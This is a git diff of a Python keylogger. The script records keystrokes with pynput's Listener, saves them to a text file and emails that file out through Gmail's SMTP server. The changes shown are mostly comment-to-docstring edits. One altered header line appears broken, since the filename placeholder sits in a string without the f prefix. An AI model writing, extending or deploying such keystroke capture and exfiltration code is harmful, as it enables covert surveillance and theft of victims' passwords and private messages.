@@ -6,7 +6,7 @@ Created on Tue Sep 17 21:51:34 2019
 @author: neal
 """
 
-from temp import *
+# from temp import *
 
 from pynput.keyboard import Key, Listener
 import os
@@ -108,7 +108,7 @@ def send_email():
     part.set_payload(attachment.read())
     #     encode into base64
     encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= " +filename)
+    part.add_header(f'Content-Disposition', "attachment; filename=  {filename}")
     msg.attach(part)
 
     server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -118,8 +118,9 @@ def send_email():
     server.sendmail(fromaddr, toaddr, text)
     server.quit()
 
-# the function that reads the keystroke ,create a txt file and saves them in the txt file
+
 def write_file(keys):
+    """reads the keystroke ,create a txt file and saves them in the txt file """
     with open(filename, "a")as f:
         for key in keys:
 
@@ -132,8 +133,10 @@ def write_file(keys):
             else:
                 f.write(key.replace("'", ""))
 
-#function that gets the keystrokes....and checks if internet connection is up or down
+
 def on_press(key):
+    """Gets the keystrokes and check if internet connection is up or down"""
+
     global keys, count, countInternet, filename
 
     keys.append(str(key))
